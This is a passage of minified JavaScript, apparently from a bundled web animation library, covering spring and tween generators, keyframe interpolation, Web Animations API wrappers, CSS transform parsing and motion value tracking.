0?x:o(x);y!==x&&(v=y-d);const g=S=>-v*Math.exp(-S/s),b=S=>{const T=g(S);h.done=Math.abs(T)<=c,h.value=h.done?y:y+T};let k,C;const E=S=>{m(h.value)&&(k=S,C=fa({keyframes:[h.value,f(h.value)],velocity:-g(S)/s*1e3,damping:r,stiffness:i,restDelta:c,restSpeed:u}))};return E(0),{calculatedDuration:null,next:S=>{let T=!1;return!C&&k===void 0&&(T=!0,b(S),E(S)),k!==void 0&&S>=k?C.next(S-k):(!T&&b(S),h)}}}function LS(e,t,n){const s=[],r=n||Xt.mix||Xd,i=e.length-1;for(let o=0;o<i;o++){let a=r(e[o],e[o+1]);if(t){const l=Array.isArray(t)?t[o]||Ye:t;a=Ai(l,a)}s.push(a)}return s}function eh(e,t,{clamp:n=!0,ease:s,mixer:r}={}){const i=e.length;if(Qa(i===t.length),i===1)return()=>t[0];if(i===2&&t[0]===t[1])return()=>t[1];const o=e[0]===e[1];e[0]>e[i-1]&&(e=[...e].reverse(),t=[...t].reverse());const a=LS(t,s,r),l=a.length,c=u=>{if(o&&u<e[0])return t[0];let d=0;if(l>1)for(;d<e.length-2&&!(u<e[d+1]);d++);const h=Xs(e[d],e[d+1],u);return a[d](h)};return n?u=>c(ut(e[0],e[i-1],u)):c}function DS(e,t){const n=e[e.length-1];for(let s=1;s<=t;s++){const r=Xs(0,t,s);e.push(H(n,1,r))}}function ev(e){const t=[0];return DS(t,e.length-1),t}function _S(e,t){return e.map(n=>n*t)}function FS(e,t){return e.map(()=>t||Fw).splice(0,e.length-1)}function Bs({duration:e=300,keyframes:t,times:n,ease:s="easeInOut"}){const r=Y1(s)?s.map(Xp):Xp(s),i={done:!1,value:t[0]};if(t.length===2&&!Array.isArray(r)&&(!n||n.length!==2||n[0]===0&&n[1]===1)){const[l,c]=t,u=l===c?void 0:(Xt.mix||Xd)(l,c);return{calculatedDuration:e,next:d=>(i.value=u?u(r(e>0?ut(0,1,d/e):1)):c,i.done=d>=e,i)}}const o=_S(n&&n.length===t.length?n:ev(t),e),a=eh(o,t,{ease:Array.isArray(r)?r:FS(t,r)});return{calculatedDuration:e,next:l=>(i.value=a(l),i.done=l>=e,i)}}const BS=5;function VS(e,t,n){const s=Math.max(t-BS,0);return zd(n-e(s),t-s)}function tv(e,t,n=0){return t<=0?n:e.velocity?e.velocity(t):VS(s=>e.next(s).value,t,e.next(t).value)}const WS=e=>e!==null;function Ga(e,{repeat:t,repeatType:n="loop"},s,r=1){const i=e.filter(WS),a=r<0||t&&n!=="loop"&&t%2===1?0:i.length-1;return!a||s===void 0?i[a]:s}const US={decay:lu,inertia:lu,tween:Bs,keyframes:Bs,spring:fa};function th(e){typeof e.type=="string"&&(e.type=US[e.type])}function nv(e,t){return{kind:e,animation:t,timestamp:be.now(),frameTimestamp:ce.timestamp,frameIsProcessing:ce.isProcessing}}function sv(e,t,n){const s=globalThis.__MOTION_INSPECT__;if(s)try{s({...nv("animation-start",e),options:n?{...t,...n}:t})}catch{}}function zS(e,t){const n=globalThis.__MOTION_INSPECT__;if(n)try{n({...nv("layout-animation-start",e),node:t})}catch{}}class Ka{constructor(){this.isResolved=!1}get finished(){return this._finished||(this._finished=this.isResolved?Promise.resolve():new Promise(t=>{this._resolve=t})),this._finished}updateFinished(){this._finished=this._resolve=void 0,this.isResolved=!1}notifyFinished(){var t;this.isResolved=!0,(t=this._resolve)==null||t.call(this)}then(t,n){return this.finished.then(t,n)}}const $S=e=>e/100;class ma extends Ka{constructor(t){super(),this.state="idle",this.startTime=null,this.isStopped=!1,this.currentTime=0,this.holdTime=null,this.playbackSpeed=1,this.delayState={done:!1,value:void 0},this.stop=()=>{var s,r;const{motionValue:n}=this.options;n&&n.updatedAt!==be.now()&&this.tick(be.now()),this.isStopped=!0,this.state!=="idle"&&(this.teardown(),(r=(s=this.options).onStop)==null||r.call(s))},this.options=t,this.initAnimation(),this.play(),t.autoplay===!1&&this.pause(),sv(this,this.options)}initAnimation(){const{options:t}=this;th(t);const{type:n=Bs,repeat:s=0,repeatDelay:r=0,repeatType:i,velocity:o=0}=t;let{keyframes:a}=t;const l=n||Bs;l!==Bs&&typeof a[0]!="number"&&(this.mixKeyframes=Ai($S,Xd(a[0],a[1])),a=[0,100]);const c=l(a===t.keyframes?t:{...t,keyframes:a});i==="mirror"&&(this.mirroredGenerator=l({...t,keyframes:[...a].reverse(),velocity:-o})),c.calculatedDuration===null&&(c.calculatedDuration=Zd(c));const{calculatedDuration:u}=c;this.calculatedDuration=u,this.resolvedDuration=u+r,this.totalDuration=this.resolvedDuration*(s+1)-r,this.generator=c}updateTime(t){const n=Math.round(t-this.startTime)*this.playbackSpeed;this.holdTime!==null?this.currentTime=this.holdTime:this.currentTime=n}tick(t,n=!1){const{generator:s,totalDuration:r,mixKeyframes:i,mirroredGenerator:o,resolvedDuration:a,calculatedDuration:l}=this;if(this.startTime===null)return s.next(0);const{delay:c=0,keyframes:u,repeat:d,repeatType:h,repeatDelay:m,type:f,onUpdate:v,finalKeyframe:x}=this.options;this.speed>0?this.startTime=Math.min(this.startTime,t):this.speed<0&&(this.startTime=Math.min(t-r/this.speed,this.startTime)),n?this.currentTime=t:this.updateTime(t);const y=this.currentTime-c*(this.playbackSpeed>=0?1:-1),g=this.playbackSpeed>=0?y<0:y>r;this.currentTime=Math.max(y,0),this.state==="finished"&&this.holdTime===null&&(this.currentTime=r);let b=this.currentTime,k=s;if(d){const T=Math.min(this.currentTime,r)/a;let q=Math.floor(T),R=T%1;!R&&T>=1&&(R=1),R===1&&q--,q=Math.min(q,d+1),!!(q%2)&&(h==="reverse"?(R=1-R,m&&(R-=m/a)):h==="mirror"&&(k=o)),b=ut(0,1,R)*a}let C;g?(this.delayState.value=u[0],C=this.delayState):C=k.next(b),i&&!g&&(C.value=i(C.value));let{done:E}=C;!g&&l!==null&&(E=this.playbackSpeed>=0?this.currentTime>=r:this.currentTime<=0);const S=this.holdTime===null&&(this.state==="finished"||this.state==="running"&&E);return S&&f!==lu&&(C.value=Ga(u,this.options,x,this.speed)),v&&v(C.value),S&&this.finish(),C}then(t,n){return this.finished.then(t,n)}get duration(){return Ge(this.calculatedDuration)}get iterationDuration(){const{delay:t=0}=this.options||{};return this.duration+Ge(t)}get time(){return Ge(this.currentTime)}set time(t){t=at(t),this.currentTime=t,this.startTime===null||this.holdTime!==null||this.playbackSpeed===0?this.holdTime=t:this.driver&&(this.startTime=this.driver.now()-t/this.playbackSpeed),this.driver?this.driver.start(!1):(this.startTime=0,this.state="paused",this.holdTime=t,this.tick(t))}getGeneratorVelocity(){return tv(this.generator,this.currentTime,this.options.velocity)}get speed(){return this.playbackSpeed}set speed(t){const n=this.playbackSpeed!==t;n&&this.driver&&this.updateTime(be.now()),this.playbackSpeed=t,n&&this.driver&&(this.time=Ge(this.currentTime))}play(){var r,i;if(this.isStopped)return;const{driver:t=qS,startTime:n}=this.options;this.driver||(this.driver=t(o=>this.tick(o))),(i=(r=this.options).onPlay)==null||i.call(r);const s=this.driver.now();this.state==="finished"?(this.updateFinished(),this.startTime=s):this.holdTime!==null?this.startTime=s-this.holdTime:this.startTime||(this.startTime=n??s),this.state==="finished"&&this.speed<0&&(this.startTime+=this.calculatedDuration),this.holdTime=null,this.state="running",this.driver.start()}pause(){this.state="paused",this.updateTime(be.now()),this.holdTime=this.currentTime}complete(){this.state!=="running"&&this.play(),this.state="finished",this.holdTime=null}finish(){var t,n;this.notifyFinished(),this.teardown(),this.state="finished",(n=(t=this.options).onComplete)==null||n.call(t)}cancel(){var t,n;this.holdTime=null,this.startTime=0,this.tick(0),this.teardown(),(n=(t=this.options).onCancel)==null||n.call(t)}teardown(){this.state="idle",this.stopDriver(),this.startTime=this.holdTime=null}stopDriver(){this.driver&&(this.driver.stop(),this.driver=void 0)}sample(t){return this.startTime=0,this.tick(t,!0)}attachTimeline(t){var n;return this.options.allowFlatten&&(this.options.type="keyframes",this.options.ease="linear",this.initAnimation()),(n=this.driver)==null||n.stop(),t.observe(this)}}const HS=new Set(["brightness","contrast","saturate","opacity"]);function QS(e){const[t,n]=e.slice(0,-1).split("(");if(t==="drop-shadow")return e;const[s]=n.match(Gd)||[];if(!s)return e;const r=n.replace(s,"");let i=HS.has(t)?1:0;return s!==n&&(i*=100),t+"("+i+r+")"}const GS=/\b([a-z-]*)\(.*?\)/gu,cu={...Xe,getAnimatableNone:e=>{const t=e.match(GS);return t?t.map(QS).join(" "):e}},uu={...Xe,getAnimatableNone:e=>{const t=Xe.parse(e);return Xe.createTransformer(e)(t.map(s=>typeof s=="number"?0:typeof s=="object"?{...s,alpha:1}:s))}},rf={...rr,transform:Math.round},KS={rotate:Bt,pathRotation:Bt,rotateX:Bt,rotateY:Bt,rotateZ:Bt,scale:so,scaleX:so,scaleY:so,scaleZ:so,skew:Bt,skewX:Bt,skewY:Bt,distance:N,translateX:N,translateY:N,translateZ:N,x:N,y:N,z:N,perspective:N,transformPerspective:N,opacity:ui,originX:Zp,originY:Zp,originZ:N},ga={borderWidth:N,borderTopWidth:N,borderRightWidth:N,borderBottomWidth:N,borderLeftWidth:N,borderRadius:N,borderTopLeftRadius:N,borderTopRightRadius:N,borderBottomRightRadius:N,borderBottomLeftRadius:N,width:N,maxWidth:N,height:N,maxHeight:N,top:N,right:N,bottom:N,left:N,inset:N,insetBlock:N,insetBlockStart:N,insetBlockEnd:N,insetInline:N,insetInlineStart:N,insetInlineEnd:N,padding:N,paddingTop:N,paddingRight:N,paddingBottom:N,paddingLeft:N,paddingBlock:N,paddingBlockStart:N,paddingBlockEnd:N,paddingInline:N,paddingInlineStart:N,paddingInlineEnd:N,margin:N,marginTop:N,marginRight:N,marginBottom:N,marginLeft:N,marginBlock:N,marginBlockStart:N,marginBlockEnd:N,marginInline:N,marginInlineStart:N,marginInlineEnd:N,fontSize:N,backgroundPositionX:N,backgroundPositionY:N,...KS,zIndex:rf,fillOpacity:ui,strokeOpacity:ui,numOctaves:rf},YS={...ga,color:he,backgroundColor:he,outlineColor:he,fill:he,stroke:he,borderColor:he,borderTopColor:he,borderRightColor:he,borderBottomColor:he,borderLeftColor:he,filter:cu,WebkitFilter:cu,mask:uu,WebkitMask:uu},rv=e=>YS[e],XS=new Set([cu,uu]);function nh(e,t){let n=rv(e);return XS.has(n)||(n=Xe),n.getAnimatableNone?n.getAnimatableNone(t):void 0}function JS(e){for(let t=1;t<e.length;t++)e[t]??(e[t]=e[t-1])}const zn=e=>e*180/Math.PI,du=e=>{const t=zn(Math.atan2(e[1],e[0]));return hu(t)},ZS={x:4,y:5,translateX:4,translateY:5,scaleX:0,scaleY:3,scale:e=>(Math.abs(e[0])+Math.abs(e[3]))/2,rotate:du,rotateZ:du,skewX:e=>zn(Math.atan(e[1])),skewY:e=>zn(Math.atan(e[2])),skew:e=>(Math.abs(e[1])+Math.abs(e[2]))/2},hu=e=>(e=e%360,e<0&&(e+=360),e),of=du,af=e=>Math.sqrt(e[0]*e[0]+e[1]*e[1]),lf=e=>Math.sqrt(e[4]*e[4]+e[5]*e[5]),eT={x:12,y:13,z:14,translateX:12,translateY:13,translateZ:14,scaleX:af,scaleY:lf,scale:e=>(af(e)+lf(e))/2,rotateX:e=>hu(zn(Math.atan2(e[6],e[5]))),rotateY:e=>hu(zn(Math.atan2(-e[2],e[0]))),rotateZ:of,rotate:of,skewX:e=>zn(Math.atan(e[4])),skewY:e=>zn(Math.atan(e[1])),skew:e=>(Math.abs(e[1])+Math.abs(e[4]))/2};function pu(e){return e.includes("scale")?1:0}function fu(e,t){if(!e||e==="none")return pu(t);const n=e.match(/^matrix3d\(([-\d.e\s,]+)\)$/u);let s,r;if(n)s=eT,r=n;else{const a=e.match(/^matrix\(([-\d.e\s,]+)\)$/u);s=ZS,r=a}if(!r)return pu(t);const i=s[t],o=r[1].split(",").map(nT);return typeof i=="function"?i(o):o[i]}const tT=(e,t)=>{const{transform:n="none"}=getComputedStyle(e);return fu(n,t)};function nT(e){return parseFloat(e.trim())}const ir=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],or=new Set([...ir,"pathRotation"]),cf=e=>e===rr||e===N,sT=new Set(["x","y","z"]),rT=ir.filter(e=>!sT.has(e));function iT(e){const t=[];return rT.forEach(n=>{const s=e.getValue(n);if(s!==void 0){const r=s.get(),i=n.startsWith("scale")?1:0;if(r===i)return;t.push([n,r]),s.set(i)}}),t}const oT=new Set(["bottom","right"]);function uf(e,t,n,s,r,i){const o=parseFloat(e);if(!isNaN(o))return o;const{min:a,max:l}=t()[n],c=l-a;return i==="border-box"?c:c-parseFloat(s)-parseFloat(r)}const Gn={width:({width:e,paddingLeft:t="0",paddingRight:n="0",boxSizing:s},r)=>uf(e,r,"x",t,n,s),height:({height:e,paddingTop:t="0",paddingBottom:n="0",boxSizing:s},r)=>uf(e,r,"y",t,n,s),top:({top:e})=>parseFloat(e),left:({left:e})=>parseFloat(e),bottom:({top:e},t)=>{const{y:n}=t();return parseFloat(e)+(n.max-n.min)},right:({left:e},t)=>{const{x:n}=t();return parseFloat(e)+(n.max-n.min)},x:({transform:e})=>fu(e,"x"),y:({transform:e})=>fu(e,"y")};Gn.translateX=Gn.x;Gn.translateY=Gn.y;const Kn=new Set;let mu=!1,gu=!1,yu=!1;function iv(){if(gu){const e=[],t=new Set,n=new Set;Kn.forEach(r=>{r.needsMeasurement&&(e.push(r),t.add(r.element),oT.has(r.name)&&n.add(r.element))});const s=new Map;n.forEach(r=>{const i=iT(r);i.length&&(s.set(r,i),r.render())}),e.forEach(r=>r.measureInitialState()),t.forEach(r=>{r.render();const i=s.get(r);i&&i.forEach(([o,a])=>{var l;(l=r.getValue(o))==null||l.set(a)})}),e.forEach(r=>r.measureEndState()),e.forEach(r=>{r.suspendedScrollY!==void 0&&window.scrollTo(0,r.suspendedScrollY)})}gu=!1,mu=!1,Kn.forEach(e=>e.complete(yu)),Kn.clear()}function ov(){Kn.forEach(e=>{e.readKeyframes(),e.needsMeasurement&&(gu=!0)})}function aT(){yu=!0,ov(),iv(),yu=!1}function lT(e,t,n){if(typeof e=="string"){if(Wd(e)||Ud(e))return parseFloat(e);if(!Xe.test(e)&&Xe.test(n))return nh(t,n)}return e??void 0}class sh{constructor(t,n,s,r,i,o=!1){this.state="pending",this.isAsync=!1,this.needsMeasurement=!1,this.unresolvedKeyframes=[...t],this.onComplete=n,this.name=s,this.motionValue=r,this.element=i,this.isAsync=o}scheduleResolve(){this.state="scheduled",this.isAsync?(Kn.add(this),mu||(mu=!0,B.read(ov),B.resolveKeyframes(iv))):(this.readKeyframes(),this.complete())}readKeyframes(){const{unresolvedKeyframes:t,name:n,element:s,motionValue:r}=this;if(t[0]===null){const i=r==null?void 0:r.get(),o=t[t.length-1];if(i!==void 0)t[0]=i;else if(s&&n){const a=lT(s.readValue(n,o),n,o);a!==void 0&&(t[0]=a)}t[0]===void 0&&(t[0]=o),r&&i===void 0&&r.set(t[0])}JS(t)}setFinalKeyframe(){}measureInitialState(){}renderEndStyles(){}measureEndState(){}complete(t=!1){this.state="complete",this.onComplete(this.unresolvedKeyframes,this.finalKeyframe,t),Kn.delete(this)}cancel(){this.state==="scheduled"&&(Kn.delete(this),this.state="pending")}resume(){this.state==="pending"&&this.scheduleResolve()}}const cT=e=>e.startsWith("--");function av(e,t,n){cT(t)?e.style.setProperty(t,n):e.style[t]=n}const uT={};function rh(e,t){const n=qw(e);return()=>uT[t]??n()}const ih=rh(()=>window.ScrollTimeline!==void 0,"scrollTimeline"),lv=rh(()=>window.ViewTimeline!==void 0,"viewTimeline"),cv=rh(()=>{try{document.createElement("div").animate({opacity:0},{easing:"linear(0, 1)"})}catch{return!1}return!0},"linearEasing"),Sr=([e,t,n,s])=>`cubic-bezier(${e}, ${t}, ${n}, ${s})`,df={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:Sr([0,.65,.55,1]),circOut:Sr([.55,0,1,.45]),backIn:Sr([.31,.01,.66,-.59]),backOut:Sr([.33,1.53,.69,.99])};function uv(e,t){if(e)return typeof e=="function"?cv()?Xw(e,t):"ease-out":Bw(e)?Sr(e):Array.isArray(e)?e.map(n=>uv(n,t)||df.easeOut):df[e]}function dT(e,t,n,{delay:s=0,duration:r=300,repeat:i=0,repeatType:o="loop",ease:a="easeOut",times:l}={},c=void 0){const u={[t]:n};l&&(u.offset=l);const d=uv(a,r);Array.isArray(d)&&(u.easing=d);const h={delay:s,duration:r,easing:Array.isArray(d)?"linear":d,fill:"both",iterations:i+1,direction:o==="reverse"?"alternate":"normal"};return c&&(h.pseudoElement=c),e.animate(u,h)}function dv(e){return typeof e=="function"&&"applyToOptions"in e}function hT({type:e,...t}){return dv(e)&&cv()?e.applyToOptions(t):(t.duration??(t.duration=300),t.ease??(t.ease="easeOut"),t)}class hv extends Ka{constructor(t){if(super(),this.finishedTime=null,this.isStopped=!1,this.manualStartTime=null,!t)return;const{element:n,name:s,keyframes:r,pseudoElement:i,allowFlatten:o=!1,finalKeyframe:a,onComplete:l}=t;this.isPseudoElement=!!i,this.allowFlatten=o,this.options=t,Qa(typeof t.type!="string");const c=hT(t);this.animation=dT(n,s,r,c,i),c.autoplay===!1&&this.animation.pause(),this.animation.onfinish=()=>{if(this.finishedTime=this.time,!i){const u=Ga(r,this.options,a,this.speed);this.updateMotionValue&&this.updateMotionValue(u),av(n,s,u),this.animation.cancel()}l==null||l(),this.notifyFinished()},sv(this,t,c)}play(){this.isStopped||(this.manualStartTime=null,this.animation.play(),this.state==="finished"&&this.updateFinished())}pause(){this.animation.pause()}complete(){var t,n;(n=(t=this.animation).finish)==null||n.call(t)}cancel(){try{this.animation.cancel()}catch{}}stop(){if(this.isStopped)return;this.isStopped=!0;const{state:t}=this;t==="idle"||t==="finished"||(this.updateMotionValue?this.updateMotionValue():this.commitStyles(),this.isPseudoElement||this.cancel())}commitStyles(){var n,s,r;const t=(n=this.options)==null?void 0:n.element;!this.isPseudoElement&&(t!=null&&t.isConnected)&&((r=(s=this.animation).commitStyles)==null||r.call(s))}get duration(){var n,s;const t=((s=(n=this.animation.effect)==null?void 0:n.getComputedTiming)==null?void 0:s.call(n).duration)||0;return Ge(Number(t))}get iterationDuration(){const{delay:t=0}=this.options||{};return this.duration+Ge(t)}get time(){return Ge(Number(this.animation.currentTime)||0)}set time(t){const n=this.finishedTime!==null;this.manualStartTime=null,this.finishedTime=null,this.animation.currentTime=at(t),n&&this.animation.pause()}get speed(){return this.animation.playbackRate}set speed(t){t<0&&(this.finishedTime=null),this.animation.playbackRate=t}get state(){return this.finishedTime!==null?"finished":this.animation.playState}get startTime(){return this.manualStartTime??Number(this.animation.startTime)}set startTime(t){this.manualStartTime=this.animation.startTime=t}attachTimeline({timeline:t,rangeStart:n,rangeEnd:s,observe:r}){var i;return this.allowFlatten&&((i=this.animation.effect)==null||i.updateTiming({easing:"linear"})),this.animation.onfinish=null,t&&ih()?(this.animation.timeline=t,n&&(this.animation.rangeStart=n),s&&(this.animation.rangeEnd=s),Ye):r(this)}}const pv={anticipate:Lw,backInOut:Mw,circInOut:_w};function pT(e){return e in pv}function fT(e){typeof e.ease=="string"&&pT(e.ease)&&(e.ease=pv[e.ease])}const Ml=10;class mT extends hv{constructor(t){fT(t),th(t),super(t),t.startTime!==void 0&&t.autoplay!==!1&&(this.startTime=t.startTime),this.options=t}updateMotionValue(t){const{motionValue:n,onUpdate:s,onComplete:r,element:i,...o}=this.options;if(!n)return;if(t!==void 0){n.set(t);return}const a=new ma({...o,autoplay:!1}),l=Math.max(Ml,be.now()-this.startTime),c=ut(0,Ml,l-Ml),u=a.sample(l).value,{name:d}=this.options;i&&d&&av(i,d,u),n.setWithVelocity(a.sample(Math.max(0,l-c)).value,u,c),a.stop()}}const hf=(e,t)=>t==="zIndex"?!1:!!(typeof e=="number"||Array.isArray(e)||typeof e=="string"&&(Xe.test(e)||e==="0")&&!e.startsWith("url("));function gT(e){const t=e[0];if(e.length===1)return!0;for(let n=0;n<e.length;n++)if(e[n]!==t)return!0}function yT(e,t,n,s){const r=e[0];if(r===null)return!1;if(t==="display"||t==="visibility")return!0;const i=e[e.length-1],o=hf(r,t),a=hf(i,t);return!o||!a?!1:gT(e)||(n==="spring"||dv(n))&&s}function wu(e){e.duration=0,e.type="keyframes"}const vu=new Set(["opacity","clipPath","filter","transform","backgroundColor"]),wT=/^(?:oklch|oklab|lab|lch|color|color-mix|light-dark)\(/;function vT(e){for(let t=0;t<e.length;t++)if(typeof e[t]=="string"&&wT.test(e[t]))return!0;return!1}const pf=new Set(["color","backgroundColor","outlineColor","fill","stroke","borderColor","borderTopColor","borderRightColor","borderBottomColor","borderLeftColor"]),bT=qw(()=>Object.hasOwnProperty.call(Element.prototype,"animate"));function xT(e){var d;const{motionValue:t,name:n,repeatDelay:s,repeatType:r,damping:i,type:o,keyframes:a}=e;if(!n||!(vu.has(n)||pf.has(n)))return!1;const l=(d=t==null?void 0:t.owner)==null?void 0:d.current;if(!(l instanceof HTMLElement)&&!(l instanceof SVGElement))return!1;const{onUpdate:c,transformTemplate:u}=t.owner.getProps();return bT()&&(vu.has(n)||pf.has(n)&&vT(a))&&(n!=="transform"||!u)&&!c&&!s&&r!=="mirror"&&i!==0&&o!=="inertia"}const kT=40;class ST extends Ka{constructor(t){var l;super(),this.stop=()=>{var c,u;this._animation&&(this._animation.stop(),(c=this.stopTimeline)==null||c.call(this)),(u=this.keyframeResolver)==null||u.cancel()},this.createdAt=be.now();const{keyframes:n,name:s,motionValue:r,element:i}=t,o=t;o.autoplay??(o.autoplay=!0),o.delay??(o.delay=0),o.type??(o.type="keyframes"),o.repeat??(o.repeat=0),o.repeatDelay??(o.repeatDelay=0),o.repeatType??(o.repeatType="loop");const a=(i==null?void 0:i.KeyframeResolver)||sh;this.keyframeResolver=new a(n,(c,u,d)=>this.onKeyframesResolved(c,u,o,!d),s,r,i),(l=this.keyframeResolver)==null||l.scheduleResolve()}onKeyframesResolved(t,n,s,r){var x,y;this.keyframeResolver=void 0;const{name:i,type:o,velocity:a,delay:l,isHandoff:c,onUpdate:u}=s;this.resolvedAt=be.now();let d=!0;yT(t,i,o,a)||(d=!1,(Xt.instantAnimations||!l)&&(u==null||u(Ga(t,s,n))),t[0]=t[t.length-1],wu(s),s.repeat=0);const h=r?this.resolvedAt?this.resolvedAt-this.createdAt>kT?this.resolvedAt:this.createdAt:this.createdAt:void 0,{onComplete:m}=s;s.startTime??(s.startTime=h),s.finalKeyframe=n,s.keyframes=t,s.onComplete=()=>{m==null||m(),this.notifyFinished()};const f=d&&!c&&xT(s);let v;if(f){s.element=(y=(x=s.motionValue)==null?void 0:x.owner)==null?void 0:y.current;try{v=new mT(s)}catch{v=new ma(s)}}else v=new ma(s);this.pendingTimeline&&(this.stopTimeline=v.attachTimeline(this.pendingTimeline),this.pendingTimeline=void 0),this._animation=v}get finished(){return this._animation?this._animation.finished:super.finished}then(t,n){return this.finished.finally(t).then(()=>{})}get animation(){var t;return this._animation||((t=this.keyframeResolver)==null||t.resume(),aT()),this._animation}get duration(){return this.animation.duration}get iterationDuration(){return this.animation.iterationDuration}get time(){return this.animation.time}set time(t){this.animation.time=t}get speed(){return this.animation.speed}get state(){return this.animation.state}set speed(t){this.animation.speed=t}get startTime(){return this.animation.startTime}attachTimeline(t){return this._animation?this.stopTimeline=this.animation.attachTimeline(t):this.pendingTimeline=t,()=>this.stop()}play(){this.animation.play()}pause(){this.animation.pause()}complete(){this.animation.complete()}cancel(){var t;this._animation&&this.animation.cancel(),(t=this.keyframeResolver)==null||t.cancel()}}function fv(e,t,n,s=0,r=1){const i=Array.from(e).sort((c,u)=>c.sortNodePosition(u)).indexOf(t),o=e.size,a=(o-1)*s;return typeof n=="function"?n(i,o):r===1?i*s:a-i*s}const ff=30,TT=e=>!isNaN(parseFloat(e)),_r={current:void 0};class CT{constructor(t,n={}){this.canTrackVelocity=null,this.events={},this.updateAndNotify=s=>{const r=be.now();if(this.updatedAt!==r&&this.setPrevFrameValue(),this.prev=this.current,this.setCurrent(s),this.current!==this.prev&&(this.notifyChange(),this.dependents))for(const i of this.dependents)i.dirty()},this.hasAnimated=!1,this.setCurrent(t),this.owner=n.owner}setCurrent(t){this.current=t,this.updatedAt=be.now(),this.canTrackVelocity===null&&t!==void 0&&(this.canTrackVelocity=TT(this.current))}setPrevFrameValue(t=this.current){this.prevFrameValue=t,this.prevUpdatedAt=this.updatedAt}onChange(t){return this.on("change",t)}on(t,n){var s;return t==="change"?this.onChangeSubscribe(n):((s=this.events)[t]||(s[t]=new da)).add(n)}onChangeSubscribe(t){const{events:n}=this;return!n.change&&!this.changeSubscriber?this.changeSubscriber=t:(n.change||(n.change=new da,n.change.add(this.changeSubscriber),this.changeSubscriber=void 0),n.change.add(t)),()=>{var s;this.changeSubscriber===t?this.changeSubscriber=void 0:(s=n.change)==null||s.remove(t),this.stopIfUnobserved()}}stopIfUnobserved(){B.read(()=>{var t;!this.changeSubscriber&&!((t=this.events.change)!=null&&t.getSize())&&this.stop()})}clearListeners(){this.changeSubscriber=void 0;for(const t in this.events)this.events[t].clear()}attach(t,n){this.passiveEffect=t,this.stopPassiveEffect=n}set(t){this.passiveEffect?this.passiveEffect(t,this.updateAndNotify):this.updateAndNotify(t)}setWithVelocity(t,n,s){this.set(n),this.prev=void 0,this.prevFrameValue=t,this.prevUpdatedAt=this.updatedAt-s}jump(t,n=!0){this.updateAndNotify(t),this.prev=t,this.prevUpdatedAt=this.prevFrameValue=void 0,n&&this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}dirty(){this.notifyChange()}notifyChange(){var s;const{current:t,changeSubscriber:n}=this;n?n(t):(s=this.events.change)==null||s.notify(t)}addDependent(t){this.dependents||(this.dependents=new Set),this.dependents.add(t)}removeDependent(t){this.dependents&&this.dependents.delete(t)}get(){return _r.current&&_r.current.push(this),this.current}getPrevious(){return this.prev}getVelocity(){const t=be.now();if(!this.canTrackVelocity||this.prevFrameValue===void 0||t-this.updatedAt>ff)return 0;const n=Math.min(this.updatedAt-this.prevUpdatedAt,ff);return zd(parseFloat(this.current)-parseFloat(this.prevFrameValue),n)}start(t){return this.stop(),new Promise(n=>{var i;this.hasAnimated=!0;let s=!1,r;r=t(()=>{var o;s=!0,(o=this.events.animationComplete)==null||o.notify(),this.animation===r&&this.clearAnimation(),n()}),s||(this.animation=r),(i=this.events.animationStart)==null||i.notify()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){this.animation=void 0}destroy(){var t,n;(t=this.dependents)==null||t.clear(),(n=this.events.destroy)==null||n.notify(),this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function yt(e,t){return new CT(e,t)}function mv(e,t){if(e!=null&&e.inherit&&t){const{inherit:n,...s}=e;return{...t,...s}}return e}function oh(e,t){const n=(e==null?void 0:e[t])??(e==null?void 0:e.default)??e;return n!==e?mv(n,e):n}const AT={type:"spring",stiffness:500,damping:25,restSpeed:10},ET=e=>({type:"spring",stiffness:550,damping:e===0?2*Math.sqrt(550):30,restSpeed:10}),RT={type:"keyframes",duration:.8},PT={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},qT=(e,{keyframes:t})=>t.length>2?RT:or.has(e)?e.startsWith("scale")?ET(t[1]):AT:PT,OT=new Set(["when","delay","delayChildren","staggerChildren","staggerDirection","repeat","repeatType","repeatDelay","from","elapsed"]);function IT(e){for(const t in e)if(!OT.has(t))return!0;return!1}const ah=(e,t,n,s={},r,i)=>o=>{const a=oh(s,e)||{},l=a.delay||s.delay||0;let{elapsed:c=0}=s;c=c-at(l);const u={keyframes:Array.isArray(n)?n:[null,n],ease:"easeOut",velocity:t.getVelocity(),...a,delay:-c,onUpdate:h=>{t.set(h),a.onUpdate&&a.onUpdate(h)},onComplete:()=>{o(),a.onComplete&&a.onComplete()},name:e,motionValue:t,element:i?void 0:r};IT(a)||Object.assign(u,qT(e,u)),u.duration&&(u.duration=at(u.duration)),u.repeatDelay&&(u.repeatDelay=at(u.repeatDelay)),u.from!==void 0&&(u.keyframes[0]=u.from);let d=!1;if((u.type===!1||u.duration===0&&!u.repeatDelay)&&(wu(u),u.delay===0&&(d=!0)),(Xt.instantAnimations||Xt.skipAnimations||r!=null&&r.shouldSkipAnimations||a.skipAnimations)&&(d=!0,wu(u),u.delay=0),u.allowFlatten=!a.type&&!a.ease,d&&!i&&t.get()!==void 0){const h=Ga(u.keyframes,a);if(h!==void 0){B.update(()=>{u.onUpdate(h),u.onComplete()});return}}return a.isSync?new ma(u):new ST(u)},NT=/^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;function jT(e){const t=NT.exec(e);if(!t)return[,];const[,n,s,r]=t;return[`--${n??s}`,r]}function gv(e,t,n=1){const[s,r]=jT(e);if(!s)return;const i=window.getComputedStyle(t).getPropertyValue(s);if(i){const o=i.trim();return Wd(o)?parseFloat(o):o}return Qd(r)?gv(r,t,n+1):r}function mf(e){const t=[{},{}];return e==null||e.values.forEach((n,s)=>{t[0][s]=n.get(),t[1][s]=n.getVelocity()}),t}function lh(e,t,n,s){if(typeof t=="function"){const[r,i]=mf(s);t=t(n!==void 0?n:e.custom,r,i)}if(typeof t=="string"&&(t=e.variants&&e.variants[t]),typeof t=="function"){const[r,i]=mf(s);t=t(n!==void 0?n:e.custom,r,i)}return t}function Yn(e,t,n){const s=e.getProps();return lh(s,t,n!==void 0?n:s.custom,e)}const yv=new 